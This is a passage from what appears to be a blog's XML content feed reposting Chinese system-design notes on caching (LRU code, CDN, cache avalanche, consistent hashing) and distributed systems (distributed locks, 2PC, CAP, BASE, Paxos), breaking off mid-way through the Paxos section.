Node(null, null);        tail = new Node(null, null);        head.next = tail;        tail.pre = head;    }    public V get(K key) {        if (!map.containsKey(key)) {            return null;        }        Node node = map.get(key);        unlink(node);        appendHead(node);        return node.v;    }    public void put(K key, V value) {        if (map.containsKey(key)) {            Node node = map.get(key);            unlink(node);        }        Node node = new Node(key, value);        map.put(key, node);        appendHead(node);        if (map.size() &gt; maxSize) {            Node toRemove = removeTail();            map.remove(toRemove.k);        }    }    private void unlink(Node node) {        Node pre = node.pre;        Node next = node.next;        pre.next = next;        next.pre = pre;        node.pre = null;        node.next = null;    }    private void appendHead(Node node) {        Node next = head.next;        node.next = next;        next.pre = node;        node.pre = head;        head.next = node;    }    private Node removeTail() {        Node node = tail.pre;        Node pre = node.pre;        tail.pre = pre;        pre.next = tail;        node.pre = null;        node.next = null;        return node;    }    @Override    public Iterator&lt;K&gt; iterator() {        return new Iterator&lt;K&gt;() {            private Node cur = head.next;            @Override            public boolean hasNext() {                return cur != tail;            }            @Override            public K next() {                Node node = cur;                cur = cur.next;                return node.k;            }        };    }}</code></pre><h1 id="三、缓存位置"><a href="#三、缓存位置" class="headerlink" title="三、缓存位置"></a>三、缓存位置</h1><h2 id="浏览器"><a href="#浏览器" class="headerlink" title="浏览器"></a>浏览器</h2><p>当 HTTP 响应允许进行缓存时，浏览器会将 HTML、CSS、JavaScript、图片等静态资源进行缓存。</p><h2 id="ISP"><a href="#ISP" class="headerlink" title="ISP"></a>ISP</h2><p>网络服务提供商（ISP）是网络访问的第一跳，通过将数据缓存在 ISP 中能够大大提高用户的访问速度。</p><h2 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h2><p>反向代理位于服务器之前，请求与响应都需要经过反向代理。通过将数据缓存在反向代理，在用户请求反向代理时就可以直接使用缓存进行响应。</p><h2 id="本地缓存"><a href="#本地缓存" class="headerlink" title="本地缓存"></a>本地缓存</h2><p>使用 Guava Cache 将数据缓存在服务器本地内存中，服务器代码可以直接读取本地内存中的缓存，速度非常快。</p><h2 id="分布式缓存"><a href="#分布式缓存" class="headerlink" title="分布式缓存"></a>分布式缓存</h2><p>使用 Redis、Memcache 等分布式缓存将数据缓存在分布式缓存系统中。</p><p>相对于本地缓存来说，分布式缓存单独部署，可以根据需求分配硬件资源。不仅如此，服务器集群都可以访问分布式缓存，而本地缓存需要在服务器集群之间进行同步，实现难度和性能开销上都非常大。</p><h2 id="数据库缓存"><a href="#数据库缓存" class="headerlink" title="数据库缓存"></a>数据库缓存</h2><p>MySQL 等数据库管理系统具有自己的查询缓存机制来提高查询效率。</p><h1 id="四、CDN"><a href="#四、CDN" class="headerlink" title="四、CDN"></a>四、CDN</h1><p>内容分发网络（Content distribution network，CDN）是一种互连的网络系统，它利用更靠近用户的服务器从而更快更可靠地将 HTML、CSS、JavaScript、音乐、图片、视频等静态资源分发给用户。</p><p>CDN 主要有以下优点：</p><ul><li>更快地将数据分发给用户；</li><li>通过部署多台服务器，从而提高系统整体的带宽性能；</li><li>多台服务器可以看成是一种冗余机制，从而具有高可用性。</li></ul><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/15313ed8-a520-4799-a300-2b6b36be314f.jpg"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/15313ed8-a520-4799-a300-2b6b36be314f.jpg" alt="img"></a></p><h1 id="五、缓存问题"><a href="#五、缓存问题" class="headerlink" title="五、缓存问题"></a>五、缓存问题</h1><h2 id="缓存穿透"><a href="#缓存穿透" class="headerlink" title="缓存穿透"></a>缓存穿透</h2><p>指的是对某个一定不存在的数据进行请求，该请求将会穿透缓存到达数据库。</p><p>解决方案：</p><ul><li>对这些不存在的数据缓存一个空数据；</li><li>对这类请求进行过滤。</li></ul><h2 id="缓存雪崩"><a href="#缓存雪崩" class="headerlink" title="缓存雪崩"></a>缓存雪崩</h2><p>指的是由于数据没有被加载到缓存中，或者缓存数据在同一时间大面积失效（过期），又或者缓存服务器宕机，导致大量的请求都到达数据库。</p><p>在有缓存的系统中，系统非常依赖于缓存，缓存分担了很大一部分的数据请求。当发生缓存雪崩时，数据库无法处理这么大的请求，导致数据库崩溃。</p><p>解决方案：</p><ul><li>为了防止缓存在同一时间大面积过期导致的缓存雪崩，可以通过观察用户行为，合理设置缓存过期时间来实现；</li><li>为了防止缓存服务器宕机出现的缓存雪崩，可以使用分布式缓存，分布式缓存中每一个节点只缓存部分的数据，当某个节点宕机时可以保证其它节点的缓存仍然可用。</li><li>也可以进行缓存预热，避免在系统刚启动不久由于还未将大量数据进行缓存而导致缓存雪崩。</li></ul><h2 id="缓存一致性"><a href="#缓存一致性" class="headerlink" title="缓存一致性"></a>缓存一致性</h2><p>缓存一致性要求数据更新的同时缓存数据也能够实时更新。</p><p>解决方案：</p><ul><li>在数据更新的同时立即去更新缓存；</li><li>在读缓存之前先判断缓存是否是最新的，如果不是最新的先进行更新。</li></ul><p>要保证缓存一致性需要付出很大的代价，缓存数据最好是那些对一致性要求不高的数据，允许缓存数据存在一些脏数据。</p><h1 id="六、数据分布"><a href="#六、数据分布" class="headerlink" title="六、数据分布"></a>六、数据分布</h1><h2 id="哈希分布"><a href="#哈希分布" class="headerlink" title="哈希分布"></a>哈希分布</h2><p>哈希分布就是将数据计算哈希值之后，按照哈希值分配到不同的节点上。例如有 N 个节点，数据的主键为 key，则将该数据分配的节点序号为：hash(key)%N。</p><p>传统的哈希分布算法存在一个问题：当节点数量变化时，也就是 N 值变化，那么几乎所有的数据都需要重新分布，将导致大量的数据迁移。</p><h2 id="顺序分布"><a href="#顺序分布" class="headerlink" title="顺序分布"></a>顺序分布</h2><p>将数据划分为多个连续的部分，按数据的 ID 或者时间分布到不同节点上。例如 User 表的 ID 范围为 1 ~ 7000，使用顺序分布可以将其划分成多个子表，对应的主键范围为 1 ~ 1000，1001 ~ 2000，…，6001 ~ 7000。</p><p>顺序分布相比于哈希分布的主要优点如下：</p><ul><li>能保持数据原有的顺序；</li><li>并且能够准确控制每台服务器存储的数据量，从而使得存储空间的利用率最大。</li></ul><h1 id="七、一致性哈希"><a href="#七、一致性哈希" class="headerlink" title="七、一致性哈希"></a>七、一致性哈希</h1><p>Distributed Hash Table（DHT） 是一种哈希分布方式，其目的是为了克服传统哈希分布在服务器节点数量变化时大量数据迁移的问题。</p><h2 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h2><p>将哈希空间 [0, 2n-1] 看成一个哈希环，每个服务器节点都配置到哈希环上。每个数据对象通过哈希取模得到哈希值之后，存放到哈希环中顺时针方向第一个大于等于该哈希值的节点上。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/68b110b9-76c6-4ee2-b541-4145e65adb3e.jpg"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/68b110b9-76c6-4ee2-b541-4145e65adb3e.jpg" alt="img"></a></p><p>一致性哈希在增加或者删除节点时只会影响到哈希环中相邻的节点，例如下图中新增节点 X，只需要将它前一个节点 C 上的数据重新进行分布即可，对于节点 A、B、D 都没有影响。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/66402828-fb2b-418f-83f6-82153491bcfe.jpg"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/66402828-fb2b-418f-83f6-82153491bcfe.jpg" alt="img"></a></p><h2 id="虚拟节点"><a href="#虚拟节点" class="headerlink" title="虚拟节点"></a>虚拟节点</h2><p>上面描述的一致性哈希存在数据分布不均匀的问题，节点存储的数据量有可能会存在很大的不同。</p><p>数据不均匀主要是因为节点在哈希环上分布的不均匀，这种情况在节点数量很少的情况下尤其明显。</p><p>解决方式是通过增加虚拟节点，然后将虚拟节点映射到真实节点上。虚拟节点的数量比真实节点来得多，那么虚拟节点在哈希环上分布的均匀性就会比原来的真实节点好，从而使得数据分布也更加均匀。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li>大规模分布式存储系统</li><li><a href="https://tech.meituan.com/cache_about.html" target="_blank" rel="noopener">缓存那些事</a></li><li><a href="https://my.oschina.net/jayhu/blog/732849" target="_blank" rel="noopener">一致性哈希算法</a></li><li><a href="https://zh.wikipedia.org/wiki/%E5%85%A7%E5%AE%B9%E5%82%B3%E9%81%9E%E7%B6%B2%E8%B7%AF" target="_blank" rel="noopener">内容分发网络</a></li><li><a href="https://www.aspirationhosting.com/aspiration-cdn/" target="_blank" rel="noopener">How Aspiration CDN helps to improve your website loading speed?</a></li></ul><p>本文转载自:<a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E7%BC%93%E5%AD%98.md">https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E7%BC%93%E5%AD%98.md</a></p>]]></content>
      
      
      <categories>
          
          <category> 系统设计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 缓存 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>分布式</title>
      <link href="/2018/12/24/xi-tong-she-ji/fen-bu-shi/"/>
      <url>/2018/12/24/xi-tong-she-ji/fen-bu-shi/</url>
      
        <content type="html"><![CDATA[<h2 id="分布式"><a href="#分布式" class="headerlink" title="分布式"></a>分布式</h2><ul><li>一、分布式锁<ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E5%88%86%E5%B8%83%E5%BC%8F.md#%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%94%AF%E4%B8%80%E7%B4%A2%E5%BC%95">数据库的唯一索引</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E5%88%86%E5%B8%83%E5%BC%8F.md#redis-%E7%9A%84-setnx-%E6%8C%87%E4%BB%A4">Redis 的 SETNX 指令</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E5%88%86%E5%B8%83%E5%BC%8F.md#redis-%E7%9A%84-redlock-%E7%AE%97%E6%B3%95">Redis 的 RedLock 算法</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E5%88%86%E5%B8%83%E5%BC%8F.md#zookeeper-%E7%9A%84%E6%9C%89%E5%BA%8F%E8%8A%82%E7%82%B9">Zookeeper 的有序节点</a></li></ul></li><li>二、分布式事务<ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E5%88%86%E5%B8%83%E5%BC%8F.md#%E6%9C%AC%E5%9C%B0%E6%B6%88%E6%81%AF%E8%A1%A8">本地消息表</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E5%88%86%E5%B8%83%E5%BC%8F.md#2pc">2PC</a></li></ul></li><li>三、CAP<ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E5%88%86%E5%B8%83%E5%BC%8F.md#%E4%B8%80%E8%87%B4%E6%80%A7">一致性</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E5%88%86%E5%B8%83%E5%BC%8F.md#%E5%8F%AF%E7%94%A8%E6%80%A7">可用性</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E5%88%86%E5%B8%83%E5%BC%8F.md#%E5%88%86%E5%8C%BA%E5%AE%B9%E5%BF%8D%E6%80%A7">分区容忍性</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E5%88%86%E5%B8%83%E5%BC%8F.md#%E6%9D%83%E8%A1%A1">权衡</a></li></ul></li><li>四、BASE<ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E5%88%86%E5%B8%83%E5%BC%8F.md#%E5%9F%BA%E6%9C%AC%E5%8F%AF%E7%94%A8">基本可用</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E5%88%86%E5%B8%83%E5%BC%8F.md#%E8%BD%AF%E7%8A%B6%E6%80%81">软状态</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E5%88%86%E5%B8%83%E5%BC%8F.md#%E6%9C%80%E7%BB%88%E4%B8%80%E8%87%B4%E6%80%A7">最终一致性</a></li></ul></li><li>五、Paxos<ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E5%88%86%E5%B8%83%E5%BC%8F.md#%E6%89%A7%E8%A1%8C%E8%BF%87%E7%A8%8B">执行过程</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E5%88%86%E5%B8%83%E5%BC%8F.md#%E7%BA%A6%E6%9D%9F%E6%9D%A1%E4%BB%B6">约束条件</a></li></ul></li><li>六、Raft<ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E5%88%86%E5%B8%83%E5%BC%8F.md#%E5%8D%95%E4%B8%AA-candidate-%E7%9A%84%E7%AB%9E%E9%80%89">单个 Candidate 的竞选</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E5%88%86%E5%B8%83%E5%BC%8F.md#%E5%A4%9A%E4%B8%AA-candidate-%E7%AB%9E%E9%80%89">多个 Candidate 竞选</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E5%88%86%E5%B8%83%E5%BC%8F.md#%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5">数据同步</a></li></ul></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E5%88%86%E5%B8%83%E5%BC%8F.md#%E5%8F%82%E8%80%83">参考</a></li></ul><h1 id="一、分布式锁"><a href="#一、分布式锁" class="headerlink" title="一、分布式锁"></a>一、分布式锁</h1><p>在单机场景下，可以使用语言的内置锁来实现进程同步。但是在分布式场景下，需要同步的进程可能位于不同的节点上，那么就需要使用分布式锁。</p><p>阻塞锁通常使用互斥量来实现：</p><ul><li>互斥量为 0 表示有其它进程在使用锁，此时处于锁定状态；</li><li>互斥量为 1 表示未锁定状态。</li></ul><p>1 和 0 可以用一个整型值表示，也可以用某个数据是否存在表示。</p><h2 id="数据库的唯一索引"><a href="#数据库的唯一索引" class="headerlink" title="数据库的唯一索引"></a>数据库的唯一索引</h2><p>获得锁时向表中插入一条记录，释放锁时删除这条记录。唯一索引可以保证该记录只被插入一次，那么就可以用这个记录是否存在来判断是否存于锁定状态。</p><p>存在以下几个问题：</p><ul><li>锁没有失效时间，解锁失败的话其它进程无法再获得该锁。</li><li>只能是非阻塞锁，插入失败直接就报错了，无法重试。</li><li>不可重入，已经获得锁的进程也必须重新获取锁。</li></ul><h2 id="Redis-的-SETNX-指令"><a href="#Redis-的-SETNX-指令" class="headerlink" title="Redis 的 SETNX 指令"></a>Redis 的 SETNX 指令</h2><p>使用 SETNX（set if not exist）指令插入一个键值对，如果 Key 已经存在，那么会返回 False，否则插入成功并返回 True。</p><p>SETNX 指令和数据库的唯一索引类似，保证了只存在一个 Key 的键值对，那么可以用一个 Key 的键值对是否存在来判断是否存于锁定状态。</p><p>EXPIRE 指令可以为一个键值对设置一个过期时间，从而避免了数据库唯一索引实现方式中释放锁失败的问题。</p><h2 id="Redis-的-RedLock-算法"><a href="#Redis-的-RedLock-算法" class="headerlink" title="Redis 的 RedLock 算法"></a>Redis 的 RedLock 算法</h2><p>使用了多个 Redis 实例来实现分布式锁，这是为了保证在发生单点故障时仍然可用。</p><ul><li>尝试从 N 个相互独立 Redis 实例获取锁；</li><li>计算获取锁消耗的时间，只有当这个时间小于锁的过期时间，并且从大多数（N / 2 + 1）实例上获取了锁，那么就认为锁获取成功了；</li><li>如果锁获取失败，就到每个实例上释放锁。</li></ul><h2 id="Zookeeper-的有序节点"><a href="#Zookeeper-的有序节点" class="headerlink" title="Zookeeper 的有序节点"></a>Zookeeper 的有序节点</h2><h3 id="1-Zookeeper-抽象模型"><a href="#1-Zookeeper-抽象模型" class="headerlink" title="1. Zookeeper 抽象模型"></a>1. Zookeeper 抽象模型</h3><p>Zookeeper 提供了一种树形结构级的命名空间，/app1/p_1 节点的父节点为 /app1。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/31d99967-1171-448e-8531-bccf5c14cffe.jpg"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/31d99967-1171-448e-8531-bccf5c14cffe.jpg" alt="img"></a></p><h3 id="2-节点类型"><a href="#2-节点类型" class="headerlink" title="2. 节点类型"></a>2. 节点类型</h3><ul><li>永久节点：不会因为会话结束或者超时而消失；</li><li>临时节点：如果会话结束或者超时就会消失；</li><li>有序节点：会在节点名的后面加一个数字后缀，并且是有序的，例如生成的有序节点为 /lock/node-0000000000，它的下一个有序节点则为 /lock/node-0000000001，以此类推。</li></ul><h3 id="3-监听器"><a href="#3-监听器" class="headerlink" title="3. 监听器"></a>3. 监听器</h3><p>为一个节点注册监听器，在节点状态发生改变时，会给客户端发送消息。</p><h3 id="4-分布式锁实现"><a href="#4-分布式锁实现" class="headerlink" title="4. 分布式锁实现"></a>4. 分布式锁实现</h3><ul><li>创建一个锁目录 /lock；</li><li>当一个客户端需要获取锁时，在 /lock 下创建临时的且有序的子节点；</li><li>客户端获取 /lock 下的子节点列表，判断自己创建的子节点是否为当前子节点列表中序号最小的子节点，如果是则认为获得锁；否则监听自己的前一个子节点，获得子节点的变更通知后重复此步骤直至获得锁；</li><li>执行业务代码，完成后，删除对应的子节点。</li></ul><h3 id="5-会话超时"><a href="#5-会话超时" class="headerlink" title="5. 会话超时"></a>5. 会话超时</h3><p>如果一个已经获得锁的会话超时了，因为创建的是临时节点，所以该会话对应的临时节点会被删除，其它会话就可以获得锁了。可以看到，Zookeeper 分布式锁不会出现数据库的唯一索引实现的分布式锁释放锁失败问题。</p><h3 id="6-羊群效应"><a href="#6-羊群效应" class="headerlink" title="6. 羊群效应"></a>6. 羊群效应</h3><p>一个节点未获得锁，只需要监听自己的前一个子节点，这是因为如果监听所有的子节点，那么任意一个子节点状态改变，其它所有子节点都会收到通知（羊群效应），而我们只希望它的后一个子节点收到通知。</p><h1 id="二、分布式事务"><a href="#二、分布式事务" class="headerlink" title="二、分布式事务"></a>二、分布式事务</h1><p>指事务的操作位于不同的节点上，需要保证事务的 ACID 特性。</p><p>例如在下单场景下，库存和订单如果不在同一个节点上，就涉及分布式事务。</p><h2 id="本地消息表"><a href="#本地消息表" class="headerlink" title="本地消息表"></a>本地消息表</h2><p>本地消息表与业务数据表处于同一个数据库中，这样就能利用本地事务来保证在对这两个表的操作满足事务特性，并且使用了消息队列来保证最终一致性。</p><ol><li>在分布式事务操作的一方完成写业务数据的操作之后向本地消息表发送一个消息，本地事务能保证这个消息一定会被写入本地消息表中。</li><li>之后将本地消息表中的消息转发到 Kafka 等消息队列中，如果转发成功则将消息从本地消息表中删除，否则继续重新转发。</li><li>在分布式事务操作的另一方从消息队列中读取一个消息，并执行消息中的操作。</li></ol><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/e3bf5de4-ab1e-4a9b-896d-4b0ad7e9220a.jpg"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/e3bf5de4-ab1e-4a9b-896d-4b0ad7e9220a.jpg" alt="img"></a></p><h2 id="2PC"><a href="#2PC" class="headerlink" title="2PC"></a>2PC</h2><p>两阶段提交（Two-phase Commit，2PC），通过引入协调者（Coordinator）来协调参与者的行为，并最终决定这些参与者是否要真正执行事务。</p><h3 id="1-运行过程"><a href="#1-运行过程" class="headerlink" title="1. 运行过程"></a>1. 运行过程</h3><h4 id="1-1-准备阶段"><a href="#1-1-准备阶段" class="headerlink" title="1.1 准备阶段"></a>1.1 准备阶段</h4><p>协调者询问参与者事务是否执行成功，参与者发回事务执行结果。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/04f41228-375d-4b7d-bfef-738c5a7c8f07.jpg"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/04f41228-375d-4b7d-bfef-738c5a7c8f07.jpg" alt="img"></a></p><h4 id="1-2-提交阶段"><a href="#1-2-提交阶段" class="headerlink" title="1.2 提交阶段"></a>1.2 提交阶段</h4><p>如果事务在每个参与者上都执行成功，事务协调者发送通知让参与者提交事务；否则，协调者发送通知让参与者回滚事务。</p><p>需要注意的是，在准备阶段，参与者执行了事务，但是还未提交。只有在提交阶段接收到协调者发来的通知后，才进行提交或者回滚。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/2991c772-fb1c-4051-a9c7-932b68e76bd7.jpg"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/2991c772-fb1c-4051-a9c7-932b68e76bd7.jpg" alt="img"></a></p><h3 id="2-存在的问题"><a href="#2-存在的问题" class="headerlink" title="2. 存在的问题"></a>2. 存在的问题</h3><h4 id="2-1-同步阻塞"><a href="#2-1-同步阻塞" class="headerlink" title="2.1 同步阻塞"></a>2.1 同步阻塞</h4><p>所有事务参与者在等待其它参与者响应的时候都处于同步阻塞状态，无法进行其它操作。</p><h4 id="2-2-单点问题"><a href="#2-2-单点问题" class="headerlink" title="2.2 单点问题"></a>2.2 单点问题</h4><p>协调者在 2PC 中起到非常大的作用，发生故障将会造成很大影响。特别是在阶段二发生故障，所有参与者会一直等待，无法完成其它操作。</p><h4 id="2-3-数据不一致"><a href="#2-3-数据不一致" class="headerlink" title="2.3 数据不一致"></a>2.3 数据不一致</h4><p>在阶段二，如果协调者只发送了部分 Commit 消息，此时网络发生异常，那么只有部分参与者接收到 Commit 消息，也就是说只有部分参与者提交了事务，使得系统数据不一致。</p><h4 id="2-4-太过保守"><a href="#2-4-太过保守" class="headerlink" title="2.4 太过保守"></a>2.4 太过保守</h4><p>任意一个节点失败就会导致整个事务失败，没有完善的容错机制。</p><h1 id="三、CAP"><a href="#三、CAP" class="headerlink" title="三、CAP"></a>三、CAP</h1><p>分布式系统不可能同时满足一致性（C：Consistency）、可用性（A：Availability）和分区容忍性（P：Partition Tolerance），最多只能同时满足其中两项。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/f1109d04-3c67-48a3-9963-2c475f94e175.jpg"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/f1109d04-3c67-48a3-9963-2c475f94e175.jpg" alt="img"></a></p><h2 id="一致性"><a href="#一致性" class="headerlink" title="一致性"></a>一致性</h2><p>一致性指的是多个数据副本是否能保持一致的特性，在一致性的条件下，系统在执行数据更新操作之后能够从一致性状态转移到另一个一致性状态。</p><p>对系统的一个数据更新成功之后，如果所有用户都能够读取到最新的值，该系统就被认为具有强一致性。</p><h2 id="可用性"><a href="#可用性" class="headerlink" title="可用性"></a>可用性</h2><p>可用性指分布式系统在面对各种异常时可以提供正常服务的能力，可以用系统可用时间占总时间的比值来衡量，4 个 9 的可用性表示系统 99.99% 的时间是可用的。</p><p>在可用性条件下，要求系统提供的服务一直处于可用的状态，对于用户的每一个操作请求总是能够在有限的时间内返回结果。</p><h2 id="分区容忍性"><a href="#分区容忍性" class="headerlink" title="分区容忍性"></a>分区容忍性</h2><p>网络分区指分布式系统中的节点被划分为多个区域，每个区域内部可以通信，但是区域之间无法通信。</p><p>在分区容忍性条件下，分布式系统在遇到任何网络分区故障的时候，仍然需要能对外提供一致性和可用性的服务，除非是整个网络环境都发生了故障。</p><h2 id="权衡"><a href="#权衡" class="headerlink" title="权衡"></a>权衡</h2><p>在分布式系统中，分区容忍性必不可少，因为需要总是假设网络是不可靠的。因此，CAP 理论实际上是要在可用性和一致性之间做权衡。</p><p>可用性和一致性往往是冲突的，很难使它们同时满足。在多个节点之间进行数据同步时，</p><ul><li>为了保证一致性（CP），不能访问未同步完成的节点，也就失去了部分可用性；</li><li>为了保证可用性（AP），允许读取所有节点的数据，但是数据可能不一致。</li></ul><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/0b587744-c0a8-46f2-8d72-e8f070d67b4b.jpg"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/0b587744-c0a8-46f2-8d72-e8f070d67b4b.jpg" alt="img"></a></p><h1 id="四、BASE"><a href="#四、BASE" class="headerlink" title="四、BASE"></a>四、BASE</h1><p>BASE 是基本可用（Basically Available）、软状态（Soft State）和最终一致性（Eventually Consistent）三个短语的缩写。</p><p>BASE 理论是对 CAP 中一致性和可用性权衡的结果，它的核心思想是：即使无法做到强一致性，但每个应用都可以根据自身业务特点，采用适当的方式来使系统达到最终一致性。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/bc603930-d74d-4499-a3e7-2d740fc07f33.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/bc603930-d74d-4499-a3e7-2d740fc07f33.png" alt="img"></a></p><h2 id="基本可用"><a href="#基本可用" class="headerlink" title="基本可用"></a>基本可用</h2><p>指分布式系统在出现故障的时候，保证核心可用，允许损失部分可用性。</p><p>例如，电商在做促销时，为了保证购物系统的稳定性，部分消费者可能会被引导到一个降级的页面。</p><h2 id="软状态"><a href="#软状态" class="headerlink" title="软状态"></a>软状态</h2><p>指允许系统中的数据存在中间状态，并认为该中间状态不会影响系统整体可用性，即允许系统不同节点的数据副本之间进行同步的过程存在时延。</p><h2 id="最终一致性"><a href="#最终一致性" class="headerlink" title="最终一致性"></a>最终一致性</h2><p>最终一致性强调的是系统中所有的数据副本，在经过一段时间的同步后，最终能达到一致的状态。</p><p>ACID 要求强一致性，通常运用在传统的数据库系统上。而 BASE 要求最终一致性，通过牺牲强一致性来达到可用性，通常运用在大型分布式系统中。</p><p>在实际的分布式场景中，不同业务单元和组件对一致性的要求是不同的，因此 ACID 和 BASE 往往会结合在一起使用。</p><h1 id="五、Paxos"><a href="#五、Paxos" class="headerlink" title="五、Paxos"></a>五、Paxos</h1><p>用于达成共识性问题，即对多个节点产生的值，该算法能保证只选出唯一一个值。</p><p>主要有三类节点：</p><ul><li>提议者（Proposer）：提议一个值；</li><li>接受者（Acceptor）：对每个提议进行投票；</li><li>告知者（Learner）：被告知投票的结果，不参与投票过程。</li></ul><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/b988877c-0f0a-4593-916d-de2081320628.jpg"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/b988877c-0f0a-4593-916d-de2081320628.jpg" alt="img"></a></p><h2 id="执行过程"><a href="#执行过程" class="headerlink" title="执行过程"></a>执行过程</h2><p>规定一个提议包含两个字段：[n, v]，其中 n 为序号（具有唯一性），v 为提议值。</p><h3 id="1-Prepare-阶段"><a href="#1-Prepare-阶段" class="headerlink" title="1. Prepare 阶段"></a>1. Prepare 阶段</h3><p>下图演示了两个 Proposer 和三个 Acceptor 的系统中运行该算法的初始过程，每个 Proposer 都会向所有 Acceptor 发送 Prepare 请求。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/1a9977e4-2f5c-49a6-aec9-f3027c9f46a7.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/1a9977e4-2f5c-49a6-aec9-f3027c9f46a7.png" alt="img"></a></p><p>当 Acceptor 接收到一个 Prepare 请求，包含的提议为 [n1, v1]，并且之前还未接收过 Prepare 请求，那么发送一个 Prepare 响应，设置当前接收到的提议为 [n1, v1]，并且保证以后不会再接受序号小于 n1 的提议。</p><p>如下图，Acceptor X 在收到 [n=2, v=8] 的 Prepare 请求时，由于之前没有接收过提议，因此就发送一个 [no previous] 的 Prepare 响应，设置当前接收到的提议为 [n=2, v=8]，并且保证以后不会再接受序号小于 2 的提议。其它的 Acceptor 类似。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/fb44307f-8e98-4ff7-a918-31dacfa564b4.jpg"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/fb44307f-8e98-4ff7-a918-31dacfa564b4.jpg" alt="img"></a></p><p>如果 Acceptor 接收到一个 Prepare 请求，包含的提议为 [n2, v2]，并且之前已经接收过提议 [n1, v1]。如果 n1 &gt; n2，那么就丢弃该提议请求；否则，发送 Prepare 响应，该 Prepare 响应包含之前已经接收过的提议 [n1, v1]，设置当前接收到的提议为 [n2, v2]，并且保证以后不会再接受序号小于 n2 的提议。</p><p>如下图，Acceptor Z 收到 Proposer A 发来的 [n=2, v=8] 的 Prepare 请求，由于之前已经接收过 [n=4, v=5] 的提议，并且 n &gt; 2，因此就抛弃该提议请求；Acceptor X 收到 Proposer B 发来的 [n=4, v=5] 的 Prepare 请求，因为之前接收到的提议为 [n=2, v=8]，并且 2 &lt;= 4，因此就发送 [n=2, v=8] 的 Prepare 响应，设置当前接收到的提议为 [n=4, v=5]，并且保证以后不会再接受序号小于 4 的提议。Acceptor Y 类似。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/2bcc58ad-bf7f-485c-89b5-e7cafc211ce2.jpg"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/2bcc58ad-bf7f-485c-89b5-e7cafc211ce2.jpg" alt="img"></a></p><h3 id="2-Accept-阶段"><a href="#2-Accept-阶段" class="headerlink" title="2. Accept 阶段"></a>2. Accept 阶段</h3><p>当一个 Proposer 接收到超过一半 Acceptor 的 Prepare 响应时，就可以发送 Accept 请求。</p><p>Proposer A 接收到两个 Prepare 响应之后，就发送 [n=2, v=8] Accept 请求。该 Accept 请求会被所有 Acceptor 丢弃，因为此时所有 Acceptor 都保证不接受序号小于 4 的提议。</p><p>Proposer B 过后也收到了两个 Prepare 响应，因此也开始发送 Accept 请求。需要注意的是，Accept 请求的 v 需要取它收到的最大提议编号对应的 v 值，也就是 8。因此它发送 [n=4, v=8] 的 Accept 请求。</p><p><a 